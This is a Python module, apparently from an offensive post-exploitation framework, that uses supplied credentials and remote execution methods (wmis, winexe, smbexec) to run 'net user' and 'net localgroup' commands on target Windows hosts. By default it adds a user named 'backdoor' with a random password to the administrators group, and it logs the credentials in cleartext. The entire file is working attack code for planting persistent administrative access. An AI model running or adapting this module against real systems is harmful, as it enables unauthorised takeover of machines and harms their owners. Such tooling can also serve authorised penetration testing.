"""

Module to add a local user to the system.
Defaults to adding to the "administrators" group.

Module built by @harmj0y

"""

from lib import helpers
from lib import command_methods

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Add Local User"
        self.description = "Adds a local user to the specified group on a host or host list."

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"trigger_method"   : ["wmis", "[wmis], [winexe], or [smbexec] for triggering"],
                                 "user"             : ["backdoor", "Username to add."],
                                 "group"            : ["administrators", "localgroup to add user to"],
                                 "pass"             : [helpers.randomString(length=12)+"!", "Password for the new user." ]}

    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]

        for target in self.targets:

            userToAdd = self.required_options["user"][0]
            passToAdd = self.required_options["pass"][0]
            groupToAdd = self.required_options["group"][0]

            # command to add the user:password to the machine
            userAddCommand = "net user "+userToAdd+" "+passToAdd+" /add"

            # command to add the user to the specified localgroup
            groupAddCommand = "net localgroup "+groupToAdd+" "+userToAdd+" /add"

            # execute the user add command and get the result
            userAddResult = command_methods.executeResult(target, username, password, userAddCommand, triggerMethod)

            # check all of our results as appropriate
            if userAddResult == "":
                self.output += "[!] No result file, user add '"+userToAdd+":"+passToAdd+"' failed using creds '"+username+":"+password+"' on : " + target + "\n"
            
            elif "The command completed successfully" in userAddResult:
                self.output += "[*] User '"+userToAdd+":"+passToAdd+"' successfully added using creds '"+username+":"+password+"' on " + target + "\n"

                # cleanup -> delete the user from the system
                cleanupCMD = "net user "+userToAdd+" /delete"
                self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+cleanupCMD+"|"+triggerMethod+"\n"

                # if the user add command succeeded, continue to the group add
                groupAddResult = command_methods.executeResult(target, username, password, groupAddCommand, triggerMethod)

                if groupAddResult == "":
                    self.output += "[!] No result file, user add of user '"+userToAdd+"' to localgroup '"+groupToAdd+"' failed using creds '"+username+":"+password+"' on : " + target + "\n"
                
                elif "The command completed successfully" in groupAddResult:
                    self.output += "[*] User '"+userToAdd+"' successfully added to localgroup '"+groupToAdd+"' using creds '"+username+":"+password+"' on " + target + "\n"
               
                else:
                    self.output += "[!] User add '"+userToAdd+"' to localgroup '"+groupToAdd+"' failed using creds '"+username+":"+password+"' on : " + target + "\n"

            else:
                self.output += "[!] User add '"+userToAdd+":"+passToAdd+"' failed using creds '"+username+":"+password+"' on : " + target + "\n"
